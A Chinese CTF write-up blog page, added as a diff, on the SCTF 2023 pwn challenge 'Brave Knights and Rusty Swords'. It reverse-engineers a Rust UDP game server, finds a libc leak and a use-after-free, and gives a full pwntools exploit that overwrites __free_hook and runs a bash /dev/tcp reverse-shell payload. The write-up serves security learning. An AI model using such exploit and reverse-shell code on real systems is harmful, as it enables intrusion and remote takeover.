@@ -1,0 +1,750 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/four.jpg">
+  <link rel="icon" href="/img/four.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xtxtn">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="上次在aliyun的比赛上也遇到过rust语言的题，但是那道rust的题是一道传统的堆菜单题，题目的输入输出完全都不用看ida就知道，而且后门函数也直接给出了，很容易就可以写出来。这次sctf给的是一个upd服务程序，输入输出也没有给你很多信息，这下就只能去拿ida去硬逆了（😭）。 由于是udp服务，nc连接时使用nc -u 192.168.184.133 8080。 part1首先看到ida中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sctf2023 Brave Knights and Rusty Swords">
+<meta property="og:url" content="https://xtxtn.github.io/2023/06/27/sctf2023/index.html">
+<meta property="og:site_name" content="xtxtn&#39;s Blog">
+<meta property="og:description" content="上次在aliyun的比赛上也遇到过rust语言的题，但是那道rust的题是一道传统的堆菜单题，题目的输入输出完全都不用看ida就知道，而且后门函数也直接给出了，很容易就可以写出来。这次sctf给的是一个upd服务程序，输入输出也没有给你很多信息，这下就只能去拿ida去硬逆了（😭）。 由于是udp服务，nc连接时使用nc -u 192.168.184.133 8080。 part1首先看到ida中">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-27%20212845.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-27%20214212.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-28%20120409.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-27%20221618.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-27%20222735.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-27%20223650.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-27%20224141.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-27%20231805.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-27%20231914.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-27%20234719.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-28%20001800.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-28%20012725.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-28%20012544.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-28%20012849.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-27%20164146.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-28%20015131.png">
+<meta property="article:published_time" content="2023-06-27T12:00:49.209Z">
+<meta property="article:modified_time" content="2023-06-28T04:38:27.201Z">
+<meta property="article:author" content="xtxtn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xtxtn.github.io/img/14/Screenshot%202023-06-27%20212845.png">
+  
+  
+  
+  <title>sctf2023 Brave Knights and Rusty Swords - xtxtn&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xtxtn.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xtxtn</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/th.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sctf2023 Brave Knights and Rusty Swords"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-27 20:00" pubdate>
+          2023年6月27日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          47 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sctf2023 Brave Knights and Rusty Swords</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>上次在aliyun的比赛上也遇到过rust语言的题，但是那道rust的题是一道传统的堆菜单题，题目的输入输出完全都不用看ida就知道，而且后门函数也直接给出了，很容易就可以写出来。这次sctf给的是一个upd服务程序，输入输出也没有给你很多信息，这下就只能去拿ida去硬逆了（😭）。</p>
+<p>由于是udp服务，nc连接时使用<code>nc -u 192.168.184.133 8080</code>。</p>
+<h4 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h4><p>首先看到ida中的main函数很简单，肯定不是逻辑的主体，使用gdb attach程序的进程后发现有server_game::main函数，这个就是真正的逻辑主体函数：</p>
+<img src="/img/14/Screenshot 2023-06-27 212845.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" />
+
+<p>点进去发现流程极其复杂，而且很多代码块都是<code>jmp  short $+2</code>相连接的，不知道为什么rust这样编译（感觉没有这个jmp，程序也能往后直接执行相应的代码块）</p>
+<img src="/img/14/Screenshot 2023-06-27 214212.png" srcset="/img/loading.gif" lazyload>
+
+<p>伪代码就更不用说了，也不是特别好看，有很多奇奇怪怪的函数，不过这里重点关注<code>UdpSocket::recv_from</code>，因为用户就是通过这个函数来传递数据给程序的，而该udp服务是不断接收命令循环的，所以可以初步定位到如下伪代码：</p>
+<img src="/img/14/Screenshot 2023-06-28 120409.png" srcset="/img/loading.gif" lazyload>
+
+<p>​                               </p>
+<h4 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h4><p>接下来就是找到程序是怎样比较的字符串的，我当时是随便输入一段字符，然后使用gdb定位到<code>UdpSocket::send_to</code>函数，这时是所有的字符都判断失败的情况：</p>
+<img src="/img/14/Screenshot 2023-06-27 221618.png" srcset="/img/loading.gif" lazyload style="zoom: 50%;" />
+
+<p>接下来使用ida从定位到<code>UdpSocket::send_to</code>函数自下往上找判断分支的代码块：</p>
+<img src="/img/14/Screenshot 2023-06-27 222735.png" srcset="/img/loading.gif" lazyload>
+
+<p>最后发现所有的判断分支的代码块都是如下格式，中间的那个函数估计就是判断字符串的，而字符串地址就是在rdx中，ecx就是字符串长度：</p>
+<img src="/img/14/Screenshot 2023-06-27 223650.png" srcset="/img/loading.gif" lazyload>
+
+<p>进一步查看byte_E64F1地址中的内容就可以知道比较的字符串了</p>
+<img src="/img/14/Screenshot 2023-06-27 224141.png" srcset="/img/loading.gif" lazyload style="zoom: 50%;" />
+
+<p>​                                 </p>
+<p>最后我发现其实只有再将上面定位到的伪代码段往下多翻几行就可以看到if后有个cmp字样的函数，很容易想到这个就是判断字符串的函数，不用上面那么麻烦（🧐）</p>
+<img src= "/img/14/Screenshot 2023-06-27 224513.png">
+
+<p>​                              </p>
+<p>最后可以得到比较的字符串为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">login <br>register <br>purchase <br>fight <br>draw_000001 <br>draw_011214 <br>show_infomation <br>Data_testing_console <br>write_signature<br></code></pre></td></tr></table></figure>
+
+<p>​                                               </p>
+<h4 id="part3"><a href="#part3" class="headerlink" title="part3"></a>part3</h4><p>知道输入什么命令，接下来就容易多了。</p>
+<p>login命令的格式是给提示的，可以直接类比到register命令。</p>
+<p>purchase是用得到的100 currency去买卡。</p>
+<p>draw_000001和draw_011214去抽hero。</p>
+<p>fight是去打怪升级，升到10级这个游戏就算是赢了。</p>
+<p>Data_testing_console只有在fight完这个游戏后才能使用。</p>
+<p>fight的游戏赢了之后并没有什么去执行漏洞代码块的奖励，接下来就只能去看看Data_testing_console了。</p>
+<p>进入Data_testing_console命令，一开始就提示我们<code>Enter function name:</code>，查看<code>server_game::Data_testing_console</code>函数的伪代码，这里看伪代码也是只看<code>UdpSocket::recv_from</code>和<code>UdpSocket::send_to</code>函数附近的。发现在该函数中<code>UdpSocket::send_to</code>只调用过一次，发送接下来的字符串<code>Enter the command:</code>，使用gdb attach一下进程发现该过程是在<code>server_game::Memory_Debug_console</code>函数中（带server_game字段的函数都需要看看 😫）</p>
+<img src="/img/14/Screenshot 2023-06-27 231805.png" srcset="/img/loading.gif" lazyload style="zoom: 50%;" />
+
+<p>查看<code>server_game::Memory_Debug_console</code>函数伪代码发现有libc字段</p>
+<img src="/img/14/Screenshot 2023-06-27 231914.png" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />
+
+<p>联想到function name输入read后发现直接传回了read函数libc地址</p>
+<img src="/img/14/Screenshot 2023-06-27 234719.png" srcset="/img/loading.gif" lazyload>
+
+<p>剩下的输入命令就使用和part2一样的办法找到命令字段为data_push和quit</p>
+<p>​                                                         </p>
+<h4 id="part4"><a href="#part4" class="headerlink" title="part4"></a>part4</h4><p>输入quit就是退出没什么可说的，输入data_push后又会进入一个<code>server_game::data_push</code>函数，也是用前面的方法找到operation字段push和grow。输入不同的operation接着都会有一个vector number去用switch判断，最后输入一个value。</p>
+<p>push和grow，它们switch的case中代码段大致相同。</p>
+<p>就伪代码而言自己完全无法知道哪些函数是需要重点关注的，只能使用gdb一步一步去调试，调试的时候注意输入的value，如果是某函数调用的参数也是该value就仔细对比一下函数前后寄存器以及[寄存器]值的变化。</p>
+<p>这里我调试push操作时输入的value为48（value尽量特殊一点，这样便于观察），最后定位到一个带push字段的函数</p>
+<img src="/img/14/Screenshot 2023-06-28 001800.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" />
+
+<p>rdi中的值前后对比如下：</p>
+<img src= "/img/14/Screenshot 2023-06-28 001855.png">
+
+<p>​                             </p>
+<img src= "/img/14/Screenshot 2023-06-28 001912.png">
+
+<p>多调试几次后就可以知道push的操作就是将value保存到栈上，value不能大于0x100，value就是一个字节的ASCII码，前一个字段就是push数据的大小。</p>
+<p>vector number就是可以让value保存到不同区域：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># vector number = 1时，在0x95a0 + rsp(server_game::data_push函数中的栈顶) </span><br><span class="hljs-comment"># vector number = 2时，在0x96b0 + rsp</span><br><span class="hljs-comment"># vector number = 3时，在0x97c0 + rsp</span><br><span class="hljs-comment"># 每个区域正好相差0x110</span><br></code></pre></td></tr></table></figure>
+
+<p>​                                         </p>
+<p>调试grow操作时，也是定位到一个带grow字段的函数：</p>
+<img src="/img/14/Screenshot 2023-06-28 012725.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" />
+
+<p>同时该函数伪代码中的比较的数据字段意义如下：</p>
+<img src="/img/14/Screenshot 2023-06-28 012544.png" srcset="/img/loading.gif" lazyload>
+
+<p>在最后有一个带heap字段的函数，它的作用与realloc函数几乎一样：</p>
+<img src="/img/14/Screenshot 2023-06-28 012849.png" srcset="/img/loading.gif" lazyload>
+
+<p>​               </p>
+<p>最后发现vector number的作用与push一样，除了vector number &#x3D; 2以外，别的vector number都只能使用一次。</p>
+<p>当vector number &#x3D; 2，输入的value（大于0x100时就使用堆存数据）与先前的value一样时该堆块就会释放，但是指针未清零，并且依旧可以使用push传入数据，就是一个uaf。</p>
+<p>​                           </p>
+<h4 id="part5"><a href="#part5" class="headerlink" title="part5"></a>part5</h4><p>漏洞利用很简单，libc的地址是白给的，直接利用uaf来实现tcache attack去修改free_hook，最后反弹shell。</p>
+<p>最初我的利用代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">size = <span class="hljs-number">0x1d0</span><br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">2</span>, size)<br>send_payload(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">3</span>, size)<br>send_payload(<span class="hljs-number">3</span>, p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] + libc_base))<br>grow(<span class="hljs-number">4</span>, size)<br>grow(<span class="hljs-number">5</span>, size)<br>send_payload(<span class="hljs-number">5</span>, p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + libc_base))<br></code></pre></td></tr></table></figure>
+
+<p>利用vector number &#x3D; 2时可以使用多次，形成double free后直接修改tcache next指针为free_hook，再利用grow申请到free_hook，最后push数据到free_hook。但是实际上这样向free_hook写入数据是直接报错的，当push完第一个字节到free_hook上后，接下来调用drop_in_place函数：</p>
+<img src="/img/14/Screenshot 2023-06-27 164146.png" srcset="/img/loading.gif" lazyload>
+
+<p>最后有调用的free的功能，这时free_hook中仅有写入的一个字节，但依旧去调用free_hook中的错误地址：</p>
+<img src="/img/14/Screenshot 2023-06-28 015131.png" srcset="/img/loading.gif" lazyload>
+
+<p>​                                                                                         </p>
+<p>当时我就自闭了😭，之后我看<a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/38/#Brave+Knights+and+Rusty+Swords">W&amp;M的wp</a>后才知道push操作也能申请堆块，刚开始不使用grow，直接push，如果数据数据大于0x100也是会申请堆上的内存，改用push就可以解决上面的问题。</p>
+<p>​                                     </p>
+<p>最后完整的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;192.168.184.133&#x27;</span>,<span class="hljs-number">8080</span>, typ=<span class="hljs-string">&#x27;udp&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;server_game&#x27;</span>)<br>libc = elf.libc<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p.sendline(<span class="hljs-string">b&#x27;register a a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Registration successful! You have received 100 currency.&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;login a a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Welcome back&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;purchase 100&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Purchase successful! You have received 10 cards.&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;draw_000001&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;You have received a new character&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;draw_000001&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;You have received a new character&#x27;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    t = <span class="hljs-string">b&#x27;&#x27;</span><br>    p.sendline(<span class="hljs-string">b&#x27;fight&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;fight: \n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;flee\n&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p.sendline(<span class="hljs-string">b&#x27;attack&#x27;</span>)<br>        p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        t = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> t != <span class="hljs-string">b&#x27;\n&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br>        p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        t = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Congratulations!&#x27;</span> <span class="hljs-keyword">in</span> t:<br>            <span class="hljs-keyword">break</span><br>        p.recvuntil(<span class="hljs-string">b&#x27;flee\n&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Congratulations!&#x27;</span> <span class="hljs-keyword">in</span> t:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">grow</span>(<span class="hljs-params">num, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the operation:&#x27;</span>, <span class="hljs-string">b&#x27;grow&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the vector number:&#x27;</span>, <span class="hljs-built_in">str</span>(num).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the grow value:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">num, value</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the operation:&#x27;</span>, <span class="hljs-string">b&#x27;push&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the vector number:&#x27;</span>, <span class="hljs-built_in">str</span>(num).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;value:&#x27;</span>, <span class="hljs-built_in">str</span>(value).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">num, payload</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>        push(num, i)<br><br>p.sendline(<span class="hljs-string">b&#x27;Data_testing_console&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter function name:&#x27;</span>, <span class="hljs-string">b&#x27;free&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>libc_base = leak - libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>libc.address = libc_base<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the command:&#x27;</span>, <span class="hljs-string">b&#x27;data_push&#x27;</span>)<br><br><br>size = <span class="hljs-number">0x200</span><br>grow(<span class="hljs-number">1</span>, size)<br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">2</span>, size)<br>send_payload(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">3</span>, size)<br>send_payload(<span class="hljs-number">3</span>, p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x58</span>))<br>grow(<span class="hljs-number">4</span>, size)<br><br><span class="hljs-comment">#pause()</span><br>payload = <span class="hljs-string">b&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x1d0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>send_payload(<span class="hljs-number">5</span>, payload)<br>grow(<span class="hljs-number">5</span>, size)<br><br><span class="hljs-comment"># push 1 0x95a0  </span><br><span class="hljs-comment"># push 2 0x96b0</span><br><span class="hljs-comment"># push 3 0x97c0</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>sctf2023 Brave Knights and Rusty Swords</div>
+      <div>https://xtxtn.github.io/2023/06/27/sctf2023/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xtxtn</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月27日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年6月28日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-nc"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/05/30/CISCN2023-shell-we-go/" title="CISCN2023 shell we go">
+                        <span class="hidden-mobile">CISCN2023 shell we go</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
